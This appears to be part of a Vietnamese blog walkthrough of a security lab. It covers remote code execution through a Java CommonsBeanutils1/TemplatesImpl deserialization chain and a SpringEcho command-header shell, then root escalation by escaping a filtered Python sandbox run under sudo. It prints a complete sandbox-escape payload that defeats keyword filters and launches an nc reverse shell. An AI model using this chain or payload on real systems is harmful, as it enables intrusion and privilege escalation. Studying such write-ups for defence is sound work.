+<p>PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer(). Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại. Nhiệm vụ của chúng ta là tạo bytecode độc hại mà giúp RCE máy chủ để truyền vào đối tượng  TemplatesImpl giúp hoàn thành chain</p>
+<p>Tạo một đối tượng TemplatesImpl thực thi bytecode độc hại:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg"
+        title="image" /></p>
+<p>TargetByteCodes chính là bytecode độc hại được tạo ra bằng cách:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg"
+        title="image" /></p>
+<p>Tạo ra một class từ String command truyền vào -&gt; biến đổi class đó thành mảng byte tương ứng kiểu để truyền vào TemplatesImpl</p>
+<p>Rồi gọi đến hàm getPayload để tạo payload -&gt; Encode base64 để truyền lên server</p>
+<p>Thay thế + thành “%2b” để tránh lỗi kí tự khi xử lý trên server:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg"
+        title="image" /></p>
+<p>Sau khi chạy nhận được payload:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg"
+        title="image" /></p>
+<p>=&gt; Send request:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg"
+        title="image" /></p>
+<p>Ngoài ra ta cũng có thể sử dụng một cách khác. Vì ứng dụng sử dụng spring boot. Nên ta sẽ tạo class <strong>SpringEcho</strong> có tác dụng nhận một <strong>Header cmd</strong> mỗi request. Thực thi <strong>cmd</strong> đó và trả lại response. Như vậy mỗi lần thực thi một lệnh khác nhau ta sẽ không cần phải gen lại payload nữa:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg"
+        title="image" /></p>
+<p>Tham khảo:</p>
+<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md">https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md</a></p>
+<p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java">https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java</a></p>
+<p>Thảo khảo toàn bộ source tại: http://103.81.86.132/source.rar</p>
+<h3 id="datmom-to-root-with-python-escape-sandbox">Datmom to root with Python escape sandbox</h3>
+<p>Sau khi lấy được shell của user datmom. Sử dụng sudo -l ta thấy user datmom có thể chạy 2 command với đặc quyền của root</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg"
+        title="image" /></p>
+<p>Command đầu tiên không thể được lợi dụng để leo thang đặc quyền</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg"
+        title="image" /></p>
+<p>Vì để lấy được shell phải chờ một khoảng thời gian rất lâu, cũng không có input hay untrusted data nào có thể lợi dụng được</p>
+<p>Lệnh thứ 2 cho phép ta mở một sandbox python dưới đặc quyền của root</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg"
+        title="image" /></p>
+<p>Mục tiêu là từ sandbox làm sao ta có thể thực thi được os command lấy được shell root.</p>
+<p>Nội dung es2.py</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg"
+        title="image" /></p>
+<p>Ở đây. Sandbox đã được xoá hết func, lib mà ta có thể lợi dụng để gọi OS command: import, exec, eval, os …</p>
+<p>Nếu lệnh của chúng ta không chứa những từ khoá này thì sẽ được thực thi. Còn không thì sẽ đưa ra cảnh báo:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg"
+        title="image" /></p>
+<p>Vì vậy làm sao để có thể thực thi được os command từ sandbox này?</p>
+<p>Khi chúng ta không  thể import modules hay những modules mà chúng ta muốn import bị cấm.</p>
+<p>Ý tưởng tương tự khi chúng ta khai thác lỗ hổng SSTI. Được biết mỗi đối tượng trong python đều có các properties, method ẩn. Liệu từ những properties hay method ẩn này chúng ta có thể làm một điều gì đó lớn lao?</p>
+<p>Ví dụ một payload giúp escape sandbox này:</p>
+<p><code>print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('nc 127.0.0.1 4444 -e /bin/bash'))</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg"
+        title="image" /></p>
+<p>Chúng ta hãy cùng đi sâu 1 chút để hiểu hơn về payload này hoạt động ra sao:</p>
+<p>Khi làm SSTI tôi thường quan tâm đến method <strong>init</strong> khi nó xuất hiên, là một method thú vị, từ nó chúng ta hay có thể làm được 1 điều gì đó thú vị như: in ra toàn bộ biến globals, RCE …</p>
+<p>() được biết đến như cách khai báo một tuple trong python</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg"
+        title="image" /></p>
+<p>Sử dụng dir để xem toàn bộ properties hay method ẩn của 1 tuple</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg"
+        title="image" /></p>
+<p><code>.__class__</code> ( is a reference to the type of the current instance)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg"
+        title="image" /></p>
+<p>Kiên trì tìm kiếm bằng cách sử dụng dump hay tìm kiếm 1 payload mà đã được tìm ra trước đó. Ta có thể thấy <code>__init__</code> xuất hiện tại:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg"
+        title="image" /></p>
+<p>Tiếp tục đi sâu vào <code>__init__</code> ta sẽ tìm thấy một con đường giúp chúng ta gọi đến được os lib bằng cách sử dụng <code>func_globals['linecache']</code> có trong <code>__init__</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg"
+        title="image" /></p>
+<p>YES. Nhưng để tránh keyword <strong>os</strong> đã bị cấm. Ta sẽ gọi đến nó bằng cách cộng 2 chuối “o” và “s”. Trong os gọi tiếp đến “system” và giờ có thể run os command tuỳ ý.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg"
+        title="image" /></p>
+<p>Có rất nhiều payload khác cũng có thể giúp ta đạt được mục tiêu cuối cùng. Mọi người có thể tìm hiểu thêm và phân tích để hiểu rõ hơn.</p>
+<p>Cảm ơn vì đã đọc tới đây!</p>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">Security</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
